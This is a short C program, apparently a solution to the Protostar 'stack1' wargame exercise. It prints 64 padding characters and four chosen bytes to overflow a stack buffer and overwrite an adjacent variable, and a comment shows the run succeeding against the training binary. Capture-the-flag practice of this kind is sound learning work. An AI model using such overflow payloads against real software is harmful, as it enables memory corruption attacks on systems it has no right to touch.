#include <stdio.h>

int main(void){

    for(int i = 0; i < 64 ; i++){
        printf("A");
    }
    int payload = 0x61626364;
    for(int i = 0; i < 4 ; i++){
        printf("%c", ((char*)&payload)[i]);
    }
    return 0;
}


/*
user@protostar:~$ gcc stack1.c -o stack1 --std=c99
user@protostar:~$ /opt/protostar/bin/stack1 `./stack1`
you have correctly got the variable to the right value
*/
